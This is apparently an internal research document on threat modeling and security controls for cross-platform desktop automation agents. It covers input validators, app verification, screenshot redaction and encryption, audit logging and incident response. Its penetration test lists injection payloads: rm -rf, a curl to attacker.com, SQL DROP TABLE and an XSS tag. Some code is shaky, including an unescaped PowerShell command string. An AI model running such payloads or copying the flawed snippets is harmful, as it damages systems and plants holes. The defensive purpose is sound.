<DONE>
# Cross-Platform Desktop Automation: Security Deep Dive

**Purpose:** Comprehensive security analysis, threat modeling, and security controls for cross-platform desktop automation.

**Date:** 2026-02-16
**Status:** Research
**Related:** CROSS_PLATFORM_MULTI_TENANT_DESKTOP_AUTOMATION_RESEARCH.md

---

## 1. Threat Model

### 1.1 Attack Surfaces

**Surface 1: Automation Input**

- **Threat:** Malicious selectors, text injection
- **Risk:** High (direct code execution potential)
- **Mitigation:** Input validation, sandboxing

**Surface 2: Screenshot Data**

- **Threat:** Sensitive data leakage (passwords, personal info)
- **Risk:** High (privacy violation)
- **Mitigation:** Screenshot redaction, encryption

**Surface 3: UI Spoofing**

- **Threat:** Malicious app mimics legitimate UI
- **Risk:** High (unauthorized actions)
- **Mitigation:** App verification, window title validation

**Surface 4: Permission Abuse**

- **Threat:** Agent uses permissions for unauthorized actions
- **Risk:** Medium (depends on permissions granted)
- **Mitigation:** Least privilege, scope restrictions

**Surface 5: Resource Exhaustion**

- **Threat:** Agent spawns too many automations
- **Risk:** Medium (DoS, system degradation)
- **Mitigation:** Rate limiting, concurrency limits

### 1.2 Threat Actors

| Actor                 | Capabilities           | Motivation           | Risk Level |
| --------------------- | ---------------------- | -------------------- | ---------- |
| **Malicious Agent**   | Full automation access | Unauthorized actions | High       |
| **Compromised Agent** | Partial access         | Data exfiltration    | High       |
| **User Error**        | Accidental misuse      | Unintended actions   | Medium     |
| **System Compromise** | Full system access     | Complete control     | Critical   |

### 1.3 Attack Scenarios

**Scenario 1: Input Injection**

```
Attacker: Malicious agent
Action: Types shell command into terminal
Result: Command execution, system compromise
Mitigation: Input validation, sandboxing
```

**Scenario 2: Screenshot Exfiltration**

```
Attacker: Compromised agent
Action: Takes screenshots, sends to external server
Result: Sensitive data leakage
Mitigation: Screenshot encryption, access control
```

**Scenario 3: UI Spoofing**

```
Attacker: Malicious app
Action: Creates fake "Save" button, agent clicks it
Result: Unauthorized file operations
Mitigation: App verification, window validation
```

**Scenario 4: Permission Escalation**

```
Attacker: Agent with basic permissions
Action: Exploits permission to gain admin access
Result: Full system control
Mitigation: Least privilege, permission auditing
```

---

## 2. Security Controls

### 2.1 Input Validation

**Selector Validation:**

```python
class SelectorValidator:
    """Validate element selectors for security."""

    DANGEROUS_PATTERNS = [
        r"javascript:",  # Script injection
        r"on\w+\s*=",  # Event handlers (onclick, onerror, etc.)
        r"<script",  # HTML injection
        r"';",  # SQL injection attempt
        r"\|",  # Command injection
        r"`",  # Shell injection
        r"\$\(?",  # Command substitution
    ]

    def validate(self, selector: str) -> tuple[bool, str]:
        """Validate selector, return (is_valid, reason)."""
        # Check length (prevent DoS)
        if len(selector) > 1000:
            return False, "Selector too long (max 1000 chars)"

        # Check for dangerous patterns
        for pattern in self.DANGEROUS_PATTERNS:
            if re.search(pattern, selector, re.IGNORECASE):
                return False, f"Dangerous pattern detected: {pattern}"

        # Check for control characters
        if any(ord(c) < 32 and c not in "\t\n\r" for c in selector):
            return False, "Control characters not allowed"

        return True, "OK"
```

**Text Input Validation:**

```python
class TextInputValidator:
    """Validate text input for security."""

    def validate(self, text: str, context: str = "general") -> tuple[bool, str]:
        """Validate text input."""
        # Shell command injection prevention
        dangerous_chars = [";", "|", "&", "`", "$", "(", ")", "<", ">"]
        if any(char in text for char in dangerous_chars):
            return False, "Dangerous characters detected"

        # Script injection prevention
        if any(tag in text.lower() for tag in ["<script", "javascript:", "onerror"]):
            return False, "Script injection attempt detected"

        # Context-specific validation
        if context == "terminal":
            # Stricter validation for terminal input
            if re.search(r"[;&|`$]", text):
                return False, "Terminal command injection attempt"

        return True, "OK"
```

### 2.2 App Verification

**macOS App Verification:**

```python
class macOSAppVerifier:
    """Verify macOS app identity."""

    def verify_app(self, app_name: str, bundle_id: str | None = None) -> bool:
        """Verify app is legitimate."""
        # Check app signature
        if bundle_id:
            result = subprocess.run(
                ["codesign", "-dv", f"/Applications/{app_name}.app"], capture_output=True, text=True
            )
            if result.returncode != 0:
                return False

        # Check against allowlist
        allowed_apps = self._get_allowed_apps()
        return app_name in allowed_apps or bundle_id in allowed_apps

    def _get_allowed_apps(self) -> set[str]:
        """Get list of allowed apps from config."""
        # Read from config file
        config = load_config()
        return set(config.get("allowed_apps", []))
```

**Windows App Verification:**

```python
class WindowsAppVerifier:
    """Verify Windows app identity."""

    def verify_app(self, exe_path: str, window_title: str) -> bool:
        """Verify app is legitimate."""
        # Check executable signature
        result = subprocess.run(
            ["powershell", "-Command", f"Get-AuthenticodeSignature '{exe_path}'"], capture_output=True, text=True
        )
        if "NotSigned" in result.stdout:
            return False

        # Check window title matches expected pattern
        expected_patterns = self._get_allowed_patterns(exe_path)
        return any(re.match(p, window_title) for p in expected_patterns)
```

### 2.3 Screenshot Security

**Screenshot Redaction:**

```python
class ScreenshotRedactor:
    """Redact sensitive data from screenshots."""

    SENSITIVE_REGIONS = [
        {"type": "password_field", "pattern": r"password|passwd|pwd"},
        {"type": "credit_card", "pattern": r"\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}"},
        {"type": "ssn", "pattern": r"\d{3}-\d{2}-\d{4}"},
        {"type": "email", "pattern": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"},
    ]

    def redact(self, screenshot: bytes) -> bytes:
        """Redact sensitive regions from screenshot."""
        img = Image.open(io.BytesIO(screenshot))

        # Detect sensitive regions using OCR or heuristics
        sensitive_regions = self._detect_sensitive_regions(img)

        # Redact regions
        for region in sensitive_regions:
            x, y, w, h = region["x"], region["y"], region["w"], region["h"]
            # Black out region
            img.paste((0, 0, 0), (x, y, x + w, y + h))

        # Convert back to bytes
        output = io.BytesIO()
        img.save(output, format="PNG")
        return output.getvalue()
```

**Screenshot Encryption:**

```python
class ScreenshotEncryption:
    """Encrypt screenshots at rest."""

    def encrypt(self, screenshot: bytes, key: bytes) -> bytes:
        """Encrypt screenshot."""
        from cryptography.fernet import Fernet

        fernet = Fernet(key)
        return fernet.encrypt(screenshot)

    def decrypt(self, encrypted: bytes, key: bytes) -> bytes:
        """Decrypt screenshot."""
        from cryptography.fernet import Fernet

        fernet = Fernet(key)
        return fernet.decrypt(encrypted)
```

### 2.4 Scope Restrictions

**App-Level Restrictions:**

```python
class AutomationScope:
    """Define automation scope restrictions."""

    def __init__(self, policy: dict):
        self.allowed_apps = set(policy.get("allowed_apps", []))
        self.blocked_apps = set(policy.get("blocked_apps", []))
        self.allowed_windows = set(policy.get("allowed_windows", []))
        self.blocked_regions = policy.get("blocked_regions", [])

    def is_allowed(self, app_name: str, window_title: str, region: dict) -> bool:
        """Check if automation is allowed."""
        # Check app allowlist
        if self.allowed_apps and app_name not in self.allowed_apps:
            return False

        # Check app blocklist
        if app_name in self.blocked_apps:
            return False

        # Check window allowlist
        if self.allowed_windows and window_title not in self.allowed_windows:
            return False

        # Check region restrictions
        for blocked in self.blocked_regions:
            if self._region_overlaps(region, blocked):
                return False

        return True
```

**Action-Type Restrictions:**

```python
class ActionTypePolicy:
    """Policy for action type restrictions."""

    def __init__(self, policy: dict):
        self.allowed_actions = set(policy.get("allowed_actions", ["click", "type_text", "find_element"]))
        self.blocked_actions = set(policy.get("blocked_actions", []))
        self.requires_approval = set(policy.get("requires_approval", ["screenshot", "clipboard"]))

    def is_allowed(self, action_type: str) -> tuple[bool, str]:
        """Check if action is allowed."""
        if action_type in self.blocked_actions:
            return False, f"Action {action_type} is blocked"

        if self.allowed_actions and action_type not in self.allowed_actions:
            return False, f"Action {action_type} not in allowlist"

        if action_type in self.requires_approval:
            return False, f"Action {action_type} requires approval"

        return True, "OK"
```

---

## 3. Security Audit Trail

### 3.1 Comprehensive Logging

**Audit Log Entry:**

```python
@dataclass
class AutomationAuditEntry:
    """Audit log entry for automation actions."""

    timestamp: str
    agent_id: str
    user_id: str
    action: AutomationAction
    result: AutomationResult
    platform: str
    app_name: str
    window_title: str
    screenshot_before_hash: str | None
    screenshot_after_hash: str | None
    permission_checks: list[dict]
    security_flags: list[str]
    cost_usd: float
```

**Audit Logger:**

```python
class AutomationAuditLogger:
    """Comprehensive audit logging."""

    def __init__(self, audit_path: Path):
        self.audit_path = audit_path
        self.audit_path.mkdir(parents=True, exist_ok=True)

    def log_action(self, agent_id: str, action: AutomationAction, result: AutomationResult, context: dict):
        """Log automation action with full context."""
        entry = AutomationAuditEntry(
            timestamp=datetime.now(UTC).isoformat(),
            agent_id=agent_id,
            user_id=context.get("user_id", "unknown"),
            action=action,
            result=result,
            platform=platform.system(),
            app_name=context.get("app_name", "unknown"),
            window_title=context.get("window_title", "unknown"),
            screenshot_before_hash=self._hash_screenshot(context.get("screenshot_before")),
            screenshot_after_hash=self._hash_screenshot(context.get("screenshot_after")),
            permission_checks=context.get("permission_checks", []),
            security_flags=context.get("security_flags", []),
            cost_usd=context.get("cost_usd", 0.0),
        )

        # Write to audit log (JSONL format)
        audit_file = self.audit_path / f"automation_audit_{datetime.now(UTC).date()}.jsonl"
        with audit_file.open("a") as f:
            f.write(json.dumps(entry.to_dict()) + "\n")

        # Encrypt sensitive screenshots
        if context.get("screenshot_before"):
            self._encrypt_screenshot(context["screenshot_before"], entry.timestamp)
```

### 3.2 Security Event Detection

**Anomaly Detection:**

```python
class SecurityAnomalyDetector:
    """Detect security anomalies in automation."""

    def detect_anomalies(self, audit_log: Path) -> list[dict]:
        """Detect security anomalies."""
        anomalies = []

        # Load recent audit entries
        entries = self._load_recent_entries(audit_log, hours=24)

        # Check for suspicious patterns
        # 1. High failure rate
        failure_rate = sum(1 for e in entries if not e.result.success) / len(entries)
        if failure_rate > 0.1:
            anomalies.append({"type": "high_failure_rate", "rate": failure_rate, "severity": "medium"})

        # 2. Unusual app access
        app_counts = Counter(e.app_name for e in entries)
        unusual_apps = [app for app, count in app_counts.items() if count > 100]
        if unusual_apps:
            anomalies.append({"type": "unusual_app_access", "apps": unusual_apps, "severity": "high"})

        # 3. Screenshot frequency spike
        screenshot_count = sum(1 for e in entries if e.action.type == "screenshot")
        if screenshot_count > 1000:
            anomalies.append({"type": "screenshot_frequency_spike", "count": screenshot_count, "severity": "medium"})

        return anomalies
```

---

## 4. Permission Management

### 4.1 Permission Requirements Matrix

| Platform    | Permission       | Required For      | How to Grant                                               |
| ----------- | ---------------- | ----------------- | ---------------------------------------------------------- |
| **macOS**   | Accessibility    | UI automation     | System Preferences > Security & Privacy > Accessibility    |
| **macOS**   | Screen Recording | Screenshots       | System Preferences > Security & Privacy > Screen Recording |
| **Windows** | UIA Access       | UI Automation     | Run as admin or Group Policy                               |
| **Linux**   | AT-SPI           | Accessibility API | Usually granted by default                                 |

### 4.2 Permission Checkers

**macOS Permission Checker:**

```python
class macOSPermissionChecker:
    """Check macOS permissions."""

    def check_accessibility(self) -> bool:
        """Check if Accessibility permission is granted."""
        try:
            import Quartz

            app = Quartz.AXUIElementCreateApplication(os.getpid())
            return True
        except Exception:
            return False

    def check_screen_recording(self) -> bool:
        """Check if Screen Recording permission is granted."""
        # Try to capture screen
        try:
            subprocess.run(["screencapture", "-x", "/tmp/test.png"], capture_output=True, timeout=2, check=True)
            os.remove("/tmp/test.png")
            return True
        except Exception:
            return False

    def request_permissions(self):
        """Request missing permissions."""
        missing = []

        if not self.check_accessibility():
            missing.append("Accessibility")

        if not self.check_screen_recording():
            missing.append("Screen Recording")

        if missing:
            # Open System Preferences
            for perm in missing:
                if perm == "Accessibility":
                    subprocess.run(
                        ["open", "x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility"]
                    )
                elif perm == "Screen Recording":
                    subprocess.run(
                        ["open", "x-apple.systempreferences:com.apple.preference.security?Privacy_ScreenCapture"]
                    )
```

**Windows Permission Checker:**

```python
class WindowsPermissionChecker:
    """Check Windows permissions."""

    def check_uia_access(self) -> bool:
        """Check if UIA Access is enabled."""
        try:
            import comtypes.client

            automation = comtypes.client.CreateObject(...)
            return True
        except Exception:
            return False

    def request_uia_access(self):
        """Request UIA Access (requires admin)."""
        # Check if running as admin
        import ctypes

        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

        if not is_admin:
            raise PermissionError("UIA Access requires administrator privileges")

        # Enable UIA Access via registry
        import winreg

        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE
        )
        winreg.SetValueEx(key, "EnableUIAccess", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
```

### 4.3 Permission Auditing

**Permission Audit Report:**

```python
class PermissionAuditor:
    """Audit permission usage."""

    def audit_permissions(self, audit_log: Path) -> dict:
        """Generate permission audit report."""
        entries = self._load_entries(audit_log)

        # Count permission checks
        permission_checks = {}
        for entry in entries:
            for check in entry.permission_checks:
                perm_type = check["type"]
                permission_checks[perm_type] = permission_checks.get(perm_type, 0) + 1

        # Find permission denials
        denials = [e for e in entries if "permission_denied" in e.security_flags]

        return {
            "total_checks": sum(permission_checks.values()),
            "permission_breakdown": permission_checks,
            "denials": len(denials),
            "denial_rate": len(denials) / len(entries) if entries else 0,
            "apps_requiring_permissions": set(e.app_name for e in entries),
        }
```

---

## 5. Security Best Practices

### 5.1 Defense in Depth

**Layers:**

1. **Input Validation:** Validate all automation inputs
2. **App Verification:** Verify app identity before automation
3. **Scope Restrictions:** Limit automation to allowed apps/regions
4. **Permission Checks:** Verify permissions before actions
5. **Audit Logging:** Log all actions for forensics
6. **Encryption:** Encrypt sensitive data (screenshots)
7. **Sandboxing:** Isolate agent execution
8. **Rate Limiting:** Prevent resource exhaustion

### 5.2 Least Privilege

**Principle:** Grant minimal permissions required for automation.

**Implementation:**

```python
class LeastPrivilegeAutomation:
    """Automation with least privilege."""

    def __init__(self, agent_id: str, capabilities: set[str]):
        self.agent_id = agent_id
        self.capabilities = capabilities

    def execute(self, action: AutomationAction) -> AutomationResult:
        """Execute only if action requires allowed capabilities."""
        required = self._get_required_capabilities(action)

        if not required.issubset(self.capabilities):
            return AutomationResult(success=False, error=f"Insufficient privileges: {required - self.capabilities}")

        return self._execute_action(action)
```

### 5.3 Secure Defaults

**Default Configuration:**

```yaml
desktop_automation:
  security:
    # Default: Deny all
    allowed_apps: [] # Empty = deny all
    allowed_actions: ["click", "type_text", "find_element"] # Minimal set
    blocked_actions: ["screenshot", "clipboard"] # Sensitive actions blocked

    # Default: Require approval for sensitive actions
    requires_approval: ["screenshot", "clipboard", "file_operations"]

    # Default: Encrypt screenshots
    encrypt_screenshots: true

    # Default: Redact sensitive data
    redact_screenshots: true

    # Default: Audit all actions
    audit_all_actions: true
```

---

## 6. Security Testing

### 6.1 Penetration Testing

**Test Cases:**

1. **Input Injection:** Test selector and text input validation
2. **Permission Bypass:** Test if permissions can be bypassed
3. **UI Spoofing:** Test if fake UIs can be automated
4. **Screenshot Leakage:** Test if sensitive data leaks
5. **Resource Exhaustion:** Test rate limiting effectiveness

**Penetration Test Script:**

```python
def test_input_injection():
    """Test input injection vulnerabilities."""
    malicious_inputs = [
        "'; DROP TABLE users; --",
        "<script>alert('XSS')</script>",
        "`rm -rf /`",
        "$(curl attacker.com)",
    ]

    validator = SelectorValidator()
    for malicious in malicious_inputs:
        is_valid, reason = validator.validate(malicious)
        assert not is_valid, f"Input injection vulnerability: {malicious}"
```

### 6.2 Security Scanning

**Static Analysis:**

- Use Semgrep for security patterns
- Use Bandit for Python security issues
- Use SAST tools for automation code

**Dynamic Analysis:**

- Fuzz testing for input validation
- Runtime security monitoring
- Permission usage auditing

---

## 7. Incident Response

### 7.1 Security Incident Types

| Incident Type               | Severity | Response Time | Actions                               |
| --------------------------- | -------- | ------------- | ------------------------------------- |
| **Input Injection Attempt** | High     | Immediate     | Block agent, alert security           |
| **Unauthorized App Access** | High     | < 5 min       | Revoke permissions, investigate       |
| **Screenshot Leakage**      | Critical | Immediate     | Encrypt screenshots, audit trail      |
| **Permission Escalation**   | Critical | Immediate     | Revoke all permissions, isolate agent |
| **Resource Exhaustion**     | Medium   | < 15 min      | Rate limit, investigate cause         |

### 7.2 Incident Response Playbook

**Step 1: Detection**

- Monitor audit logs for anomalies
- Alert on security flags
- Automated detection via anomaly detector

**Step 2: Containment**

- Block affected agent
- Revoke permissions
- Isolate automation scope

**Step 3: Investigation**

- Review audit logs
- Analyze attack vector
- Identify root cause

**Step 4: Remediation**

- Fix vulnerability
- Update security controls
- Test fixes

**Step 5: Recovery**

- Restore agent (if safe)
- Monitor for recurrence
- Update documentation

---

## 8. Compliance Considerations

### 8.1 GDPR Compliance

**Screenshot Data:**

- Screenshots may contain personal data
- Require encryption at rest
- Require user consent for automation
- Allow user to delete automation data

**Implementation:**

```python
class GDPRCompliantAutomation:
    """GDPR-compliant automation."""

    def __init__(self):
        self.consent_required = True
        self.encryption_enabled = True
        self.data_retention_days = 30

    def requires_consent(self) -> bool:
        """Check if user consent is required."""
        return self.consent_required

    def encrypt_screenshot(self, screenshot: bytes) -> bytes:
        """Encrypt screenshot for GDPR compliance."""
        # Use user-specific encryption key
        key = self._get_user_encryption_key()
        return self._encrypt(screenshot, key)

    def delete_user_data(self, user_id: str):
        """Delete all automation data for user (GDPR right to deletion)."""
        # Delete audit logs
        # Delete screenshots
        # Delete automation history
        pass
```

### 8.2 SOC 2 Compliance

**Controls:**

- Access controls (permission management)
- Audit logging (comprehensive trails)
- Encryption (sensitive data)
- Monitoring (anomaly detection)

**Evidence:**

- Audit logs demonstrate access controls
- Encryption keys managed securely
- Monitoring alerts show detection
- Incident response documented

---

## 9. Security Checklist

### 9.1 Pre-Deployment Checklist

- [ ] Input validation implemented
- [ ] App verification implemented
- [ ] Screenshot encryption enabled
- [ ] Screenshot redaction enabled
- [ ] Audit logging enabled
- [ ] Permission checks implemented
- [ ] Scope restrictions configured
- [ ] Rate limiting enabled
- [ ] Security testing completed
- [ ] Incident response plan documented

### 9.2 Runtime Security Checklist

- [ ] Monitor audit logs daily
- [ ] Review permission usage weekly
- [ ] Check for security anomalies
- [ ] Update security controls as needed
- [ ] Test incident response quarterly
- [ ] Review and update threat model annually

---

**Status:** Security deep dive complete. Ready for security review and implementation.

---

## See Also

- [CROSS_PLATFORM_RESEARCH_CONSOLIDATED.md](./CROSS_PLATFORM_RESEARCH_CONSOLIDATED.md) - Consolidated cross-platform guide
- [CROSS_PLATFORM_MULTI_TENANT_DESKTOP_AUTOMATION_RESEARCH.md](./CROSS_PLATFORM_MULTI_TENANT_DESKTOP_AUTOMATION_RESEARCH.md) - Main research document
- [WORK_STREAM.md](../reference/WORK_STREAM.md) - Unified work stream
- [research-cross-platform-security](../reference/WORK_STREAM.md#research-cross-platform-security) - Security BACKLOG item

---

## 8. EXTENSION_SUMMARY

**Extended on:** 2026-02-17
**Extended by:** Claude Code

### Changes Made

1. Added security patterns
2. Added deep dive configurations
3. Enhanced cross-references

### Cross-References Added

- GOVERNANCE_POLICY_AUDIT_RESEARCH.md
- CROSS_PLATFORM_INTEGRATION_GUIDE.md

### Practical Additions

- Security templates
- Configuration examples
